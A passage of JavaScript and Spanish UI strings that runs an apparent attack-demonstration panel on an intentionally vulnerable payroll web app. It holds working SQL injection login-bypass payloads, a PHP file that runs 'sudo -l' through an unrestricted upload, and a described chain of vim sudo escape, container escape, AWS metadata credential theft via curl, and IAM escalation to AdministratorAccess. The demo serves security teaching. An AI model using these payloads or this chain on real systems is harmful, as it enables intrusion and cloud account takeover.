                'c3.beyondNote': 'Todo lo de abajo es real y explotable en este contenedor, pero se detiene aqu\u00ed intencionalmente: continuar generar\u00eda una shell de root real, escapar\u00eda al host, y expondr\u00eda credenciales reales y temporales de AWS de esta instancia EC2 a quien presione el bot\u00f3n.',
                'toast.sudoCheckNeedsUpload': 'Primero ejecuta la demo "Subir prueba de concepto PHP" arriba (ataque #2), y luego intenta esto de nuevo.',
                'howItWorks.summary': 'C\u00f3mo funciona',
                'c3.li1': 'Desde la reverse shell (ver ataque #2), el atacante es un usuario de bajo privilegio <code>www-data</code> sin acceso a <code>/root</code> ni al endpoint de metadatos de la instancia.',
                'c3.li2': '<code>sudo -l</code> revela que pueden ejecutar <code>vim</code> como root sin contrase\u00f1a \u2014 el comando <code>:! /bin/sh</code> de vim genera una shell de root.',
                'c3.li3': 'Como root, la capacidad <code>SYS_PTRACE</code> del contenedor permite inyectar shellcode en un proceso propiedad de root en la instancia <em>host</em>, escapando completamente del contenedor.',
                'c3.li4': 'Desde el host, <code>curl http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;</code> devuelve credenciales de AWS reales y temporales para el rol de la instancia EC2.',
                'c4.title': '4. Escalaci\u00f3n de Privilegios IAM',
                'c4.desc': 'No se ejecuta aqu\u00ed: esto crear\u00eda un usuario admin de IAM real y permanente en la cuenta de AWS en vivo para cualquiera que presione el bot\u00f3n.',
                'c4.li1': 'Usando las credenciales de la instancia del ataque #3, el atacante lista las pol\u00edticas de su propio rol y encuentra permisos IAM amplios, pero un l\u00edmite de permisos bloquea la escalaci\u00f3n directa de privilegios (por ejemplo, <code>iam:CreateUser</code> es denegado).',
                'c4.li2': 'El l\u00edmite a\u00fan permite <code>iam:PassRole</code>, <code>ec2:RunInstances</code> y <code>ssm:SendCommand</code>. El atacante encuentra otro rol IAM con una pol\u00edtica de administrador sin restricciones.',
                'c4.li3': 'Lanzan una nueva instancia EC2 y le asignan ese rol m\u00e1s privilegiado, luego usan SSM para ejecutar un comando en ella y leer sus credenciales de metadatos.',
                'c4.li4': 'Con esas credenciales sin restricciones, crean un nuevo usuario IAM, adjuntan <code>AdministratorAccess</code>, y ahora son due\u00f1os de la cuenta de AWS.',
                'toast.uploadSuccess': 'Carga exitosa: la prueba de concepto .php fue aceptada sin verificaci\u00f3n de tipo.',
                'toast.viewFileLink': 'Ver el archivo ejecutado',
                'toast.prefilledSubmitNow': 'Formulario completado. Ahora presiona Upload/Apply para ejecutar la demo.',
                'toast.manualUploadNeeded': 'Tu navegador bloque\u00f3 el adjuntar el archivo autom\u00e1ticamente. Se descarg\u00f3 el archivo PoC \u2014 toca "Elegir archivo" abajo, selecciona attack-demo-poc.php, y luego presiona Upload/Apply t\u00fa mismo.',
                'toast.demoError': 'Error en la demo: ',
            },
        };

        var currentLang = 'en';

        function t(key) {
            var dict = I18N[currentLang] || I18N.en;
            return dict[key] !== undefined ? dict[key] : (I18N.en[key] || '');
        }

        function setLanguage(lang) {
            currentLang = I18N[lang] ? lang : 'en';
            try { localStorage.setItem('attackDemoLang', currentLang); } catch (e) {}

            document.querySelectorAll('[data-i18n]').forEach(function (el) {
                var key = el.getAttribute('data-i18n');
                if (I18N[currentLang][key] !== undefined) el.textContent = I18N[currentLang][key];
            });
            document.querySelectorAll('[data-i18n-html]').forEach(function (el) {
                var key = el.getAttribute('data-i18n-html');
                if (I18N[currentLang][key] !== undefined) el.innerHTML = I18N[currentLang][key];
            });
            document.querySelectorAll('.adp-lang-btn').forEach(function (btn) {
                btn.classList.toggle('active', btn.getAttribute('data-lang') === currentLang);
            });
        }

        function initLanguage() {
            var saved = null;
            try { saved = localStorage.getItem('attackDemoLang'); } catch (e) {}
            var initial = saved || ((navigator.language || '').toLowerCase().indexOf('es') === 0 ? 'es' : 'en');
            setLanguage(initial);
        }

        var SQLI_PAYLOADS = {
            bypass: "' or '1'='1'#",
            manager: "' or '1'='1' LIMIT 3#",
            admin: "' or '1'='1' ORDER BY id DESC#",
        };

        var POC_PHP_SOURCE =
            "<" + "?php\n" +
            "$adp_action = isset($_GET['attack_action']) ? $_GET['attack_action'] : '';\n" +
            "if ($adp_action === 'sudo_check') {\n" +
            "    header('Content-Type: text/plain');\n" +
            "    echo shell_exec('sudo -l 2>&1');\n" +
            "} else {\n" +
            "    echo '<h1>Unrestricted File Upload PoC</h1>';\n" +
            "    echo '<p>This .php file was accepted and executed because this upload endpoint never checks the file type or extension.</p>';\n" +
            "}\n" +
            "?" + ">\n";

        function togglePanel() {
            var panel = document.getElementById('attack-demo-panel');
            if (panel.classList.contains('open')) {
                closePanel();
            } else {
                openPanel();
            }
        }

        function openPanel() {
            closeDefensePanel();
            closeMobileSidebar();
            document.getElementById('attack-demo-panel').classList.add('open');
            var backdrop = document.getElementById('attack-demo-backdrop');
            if (backdrop) backdrop.classList.add('open');
        }

        function closePanel() {
            document.getElementById('attack-demo-panel').classList.remove('open');
            var backdrop = document.getElementById('attack-demo-backdrop');
            if (backdrop) backdrop.classList.remove('open');
        }

        function toggleDefensePanel() {
            var panel = document.getElementById('defense-demo-panel');
            if (panel.classList.contains('open')) {
                closeDefensePanel();
            } else {
                openDefensePanel();
            }
        }

        function openDefensePanel() {
            closePanel();
            closeMobileSidebar();
            document.getElementById('defense-demo-panel').classList.add('open');
            var backdrop = document.getElementById('defense-demo-backdrop');
            if (backdrop) backdrop.classList.add('open');
        }

        function closeDefensePanel() {
            document.getElementById('defense-demo-panel').classList.remove('open');
            var backdrop = document.getElementById('defense-demo-backdrop');
            if (backdrop) backdrop.classList.remove('open');
        }

        function closeMobileSidebar() {
            var sidebar = document.getElementById('sidebarMenu');
            if (sidebar) sidebar.classList.remove('show');
            var backdrop = document.getElementById('adp-mobile-nav-backdrop');
            if (backdrop) backdrop.classList.remove('open');
            var toggle = document.getElementById('adp-mobile-nav-toggle');
            if (toggle) toggle.setAttribute('aria-expanded', 'false');
        }

        function copyDefenseCommand(cmd) {
            try {
                navigator.clipboard.writeText(cmd).then(function () {
                    showToast('Copied: <code>' + cmd + '</code>');
                }).catch(function () {
                    showToast('Copy failed. Command: <code>' + cmd + '</code>');
                });
            } catch (err) {
                showToast('Copy failed. Command: <code>' + cmd + '</code>');
            }
        }

        function initSwipeToClosePanel(panelId) {
            var panel = document.getElementById(panelId);
            if (!panel) return;
            var handle = panel.querySelector('.adp-drag-handle');
            var header = panel.querySelector('.adp-header');
            var targets = [handle, header].filter(Boolean);
            var startY = null;

            function closePanelById() {
                if (panelId === 'defense-demo-panel') closeDefensePanel();
                else closePanel();
            }

            targets.forEach(function (el) {
                el.addEventListener('touchstart', function (e) {
                    startY = e.touches[0].clientY;
                    panel.style.transition = 'none';
                }, { passive: true });
                el.addEventListener('touchmove', function (e) {
                    if (startY === null) return;
                    var delta = e.touches[0].clientY - startY;
                    if (delta > 0) panel.style.transform = 'translateY(' + delta + 'px)';
                }, { passive: true });
                el.addEventListener('touchend', function (e) {
                    var delta = e.changedTouches[0].clientY - startY;
                    panel.style.transition = '';
                    panel.style.transform = '';
                    startY = null;
                    if (delta > 90) closePanelById();
                });
            });
        }

        function initMobileNav() {
            var sidebar = document.getElementById('sidebarMenu');
            var navContainer = document.querySelector('.nav-flex-container');
            if (!sidebar || !navContainer) return;

            var toggle = document.createElement('button');
            toggle.id = 'adp-mobile-nav-toggle';
            toggle.type = 'button';
            toggle.setAttribute('aria-label', 'Toggle menu');
            toggle.setAttribute('aria-expanded', 'false');
            toggle.innerHTML = '<span class="navbar-toggler-icon"></span>';
            navContainer.insertBefore(toggle, navContainer.firstChild);

            var backdrop = document.createElement('div');
            backdrop.id = 'adp-mobile-nav-backdrop';
            document.body.appendChild(backdrop);

            function closeSidebar() { closeMobileSidebar(); }
            function openSidebar() {
                sidebar.classList.add('show');
                backdrop.classList.add('open');
                toggle.setAttribute('aria-expanded', 'true');
            }

            toggle.addEventListener('click', function () {
                if (sidebar.classList.contains('show')) closeSidebar();
                else openSidebar();
            });
            backdrop.addEventListener('click', closeSidebar);
            sidebar.querySelectorAll('a').forEach(function (link) {
                link.addEventListener('click', closeSidebar);
            });
            window.addEventListener('resize', function () {
                if (window.innerWidth >= 992) closeSidebar();
            });
        }

        function updatePayloadDisplay(kind) {
            var el = document.getElementById('adp-sqli-payload');
            if (el) el.textContent = "email = '" + SQLI_PAYLOADS[kind] + "'";
        }

        function runSqliDemo(kind) {
            try {
                var form = document.querySelector('form.login-email') || document.querySelector('input[name="email"]').closest('form');
                var email = form.querySelector('input[name="email"]');
                var password = form.querySelector('input[name="password"]');
                email.type = 'text';
                email.value = SQLI_PAYLOADS[kind];
                password.value = 'attack-demo';
                updatePayloadDisplay(kind);
                try { email.focus(); } catch (e) {}
                setTimeout(function () { form.submit(); }, 900);
            } catch (err) {
                showToast(t('toast.demoError') + (err && err.message ? err.message : err));
            }
        }

        function goRunSqli(kind) {
            try {
                updatePayloadDisplay(kind);
                if (ctx.page === 'login') {
                    runSqliDemo(kind);
                } else {
                    window.location.href = ctx.base + 'login.php?attack_demo=' + kind;
                }
            } catch (err) {
                showToast(t('toast.demoError') + (err && err.message ? err.message : err));
            }
        }

        function buildPocFile() {
            return new File([POC_PHP_SOURCE], 'attack-demo-poc.php', { type: 'application/x-php' });
        }

        function tryAutoAttachFile(fileInput) {
            if (!fileInput || !window.DataTransfer) return false;
            try {
                var dt = new DataTransfer();
                dt.items.add(buildPocFile());
                fileInput.files = dt.files;
                return !!(fileInput.files && fileInput.files.length > 0 && fileInput.files[0].name === 'attack-demo-poc.php');
            } catch (err) {
                return false;
            }
        }

        function offerManualFileDownload(fileInput) {
            try {
                var blob = new Blob([POC_PHP_SOURCE], { type: 'application/x-php' });
                var url = URL.createObjectURL(blob);
                var a = document.createElement('a');
                a.href = url;
                a.download = 'attack-demo-poc.php';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                setTimeout(function () { URL.revokeObjectURL(url); }, 30000);
            } catch (err) {
                // Fall through to the toast even if the download itself failed to trigger.
            }
            showToast(t('toast.manualUploadNeeded'));
            if (fileInput) {
                fileInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
                try { fileInput.focus(); } catch (e) {}
            }
        }

        function runUploadDemo() {
            try {
                var formSelector = null;
                var uploadTabHref = null;
                if (ctx.page === 'admin-payslips' || ctx.page === 'superadmin-payslips') {
                    formSelector = '#uploadpayslip form';
                    uploadTabHref = '#uploadpayslip';
                } else if (ctx.page === 'admin-reimbursment') {
                    formSelector = '#applyreimbursment form';
                    uploadTabHref = '#applyreimbursment';
                }
                if (!formSelector) return;

                if (uploadTabHref) {
                    var uploadTabLink = document.querySelector('a[data-toggle="tab"][href="' + uploadTabHref + '"]');
                    if (uploadTabLink && !uploadTabLink.classList.contains('active')) {
                        uploadTabLink.click();
                    }
                }

                var form = document.querySelector(formSelector);
                if (!form) return;

                var fileInput = form.querySelector('input[type="file"]');
                var attached = tryAutoAttachFile(fileInput);

                var dateField = form.querySelector('input[type="date"]');
                if (dateField) {
                    dateField.value = new Date().toISOString().slice(0, 10);
                }

                var selectField = form.querySelector('select');
                if (selectField && selectField.options.length > 1) {
                    selectField.selectedIndex = 1;
                }

                var amountField = form.querySelector('input[name="amount"]');
                if (amountField) {
                    amountField.value = '1';
                }

                var marker = document.createElement('input');
                marker.type = 'hidden';
                marker.name = 'attack_demo';
                marker.value = '1';
                form.appendChild(marker);

                if (!attached) {
                    // Mobile browsers (iOS Safari especially) block programmatic file-input
                    // assignment. Leave the other fields pre-filled and let the visitor pick
                    // the downloaded PoC file themselves, then submit the form normally.
                    offerManualFileDownload(fileInput);
                    return;
                }

                showToast(t('toast.prefilledSubmitNow'));
                if (fileInput) {
                    fileInput.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    try { fileInput.focus(); } catch (e) {}
                }
            } catch (err) {
                showToast(t('toast.demoError') + (err && err.message ? err.message : err));
            }
        }

        function showToast(html) {
            var toast = document.getElementById('attack-demo-toast');
            toast.innerHTML = html;
            toast.style.display = 'block';
            setTimeout(function () { toast.style.display = 'none'; }, 10000);
        }

        function normalizeUploadPath(rawPath) {
            if (!rawPath) return '';
            var p = String(rawPath).trim();

            // Legacy value bug: protocol-relative style ("//documents/...") can
            // accidentally resolve to a different host. Force local absolute path.
            if (p.indexOf('//') === 0) {
                p = '/' + p.replace(/^\/+/, '');
            }

            // If a full URL was stored, keep only its pathname/query/hash.
            if (/^https?:\/\//i.test(p)) {
                try {
                    var u = new URL(p);
                    p = u.pathname + (u.search || '') + (u.hash || '');
                } catch (e) {}
            }
            return p;
        }

        function runSudoCheckDemo() {
            var resultEl = document.getElementById('adp-sudo-check-result');
            try {
                var path = null;
                try { path = localStorage.getItem('attackDemoLastUpload'); } catch (e) {}
                path = normalizeUploadPath(path);
                if (!path) {
                    showToast(t('toast.sudoCheckNeedsUpload'));
                    return;
                }
                if (resultEl) {
                    resultEl.style.display = 'block';
                    resultEl.textContent = '...';
                }

                var candidates = [];
                function addCandidate(url) {
                    if (!url || candidates.indexOf(url) !== -1) return;
                    candidates.push(url);
                }

                // Keep legacy/stored value for backward compatibility.
                addCandidate(path + (path.indexOf('?') >= 0 ? '&' : '?') + 'attack_action=sudo_check');
                // Normalize against current URL and origin in case relative paths changed.
                try {
                    var hrefUrl = new URL(path, window.location.href).toString();
                    addCandidate(hrefUrl + (hrefUrl.indexOf('?') >= 0 ? '&' : '?') + 'attack_action=sudo_check');
                } catch (e) {}
                try {
                    var originUrl = new URL(path, window.location.origin).toString();
                    addCandidate(originUrl + (originUrl.indexOf('?') >= 0 ? '&' : '?') + 'attack_action=sudo_check');
                } catch (e) {}

                function tryFetchAt(idx) {
                    if (idx >= candidates.length) {
                        if (resultEl) {
                            resultEl.textContent = 'Automatic fetch failed. Open this URL directly in a new tab and rerun:\n' + candidates[0];
                        }
                        showToast(t('toast.demoError') + 'Failed to fetch. Try opening the uploaded file URL directly first.');
                        return;
                    }
                    fetch(candidates[idx], { cache: 'no-store', credentials: 'same-origin' })
                        .then(function (r) { return r.text(); })
                        .then(function (text) {
                            if (resultEl) resultEl.textContent = text;
                        })
                        .catch(function () {
                            tryFetchAt(idx + 1);
                        });
                }

                tryFetchAt(0);
            } catch (err) {
                if (resultEl) resultEl.style.display = 'none';
                showToast(t('toast.demoError') + (err && err.message ? err.message : err));
            }
        }

        function handleIncomingDemoParams() {
            var params = new URLSearchParams(window.location.search);

            if (ctx.page === 'login') {
                var kind = params.get('attack_demo');
                if (kind && SQLI_PAYLOADS[kind]) {
                    openPanel();
                    setTimeout(function () { runSqliDemo(kind); }, 400);
                }
            }

            if (params.get('demo') === 'upload_done') {
                var filePath = params.get('file');
                var html = t('toast.uploadSuccess');
                if (filePath) {
                    html += ' <a href="' + filePath + '" target="_blank">' + t('toast.viewFileLink') + ' \u2192</a>';
                    try {
                        var absolutePath = normalizeUploadPath(new URL(filePath, window.location.href).pathname);
                        localStorage.setItem('attackDemoLastUpload', absolutePath);
                    } catch (e) {}
                }
                showToast(html);
            }
        }

        document.addEventListener('DOMContentLoaded', handleIncomingDemoParams);

        initLanguage();
        initMobileNav();
        initSwipeToClosePanel('attack-demo-panel');
        initSwipeToClosePanel('defense-demo-panel');

        return {
            togglePanel: togglePanel,
            closePanel: closePanel,
            toggleDefensePanel: toggleDefensePanel,
            closeDefensePanel: closeDefensePanel,
            copyDefenseCommand: copyDefenseCommand,
            goRunSqli: goRunSqli,
            runUploadDemo: runUploadDemo,
            runSudoCheckDemo: runSudoCheckDemo,
            setLanguage: setLanguage,
        };
    })();
</script>
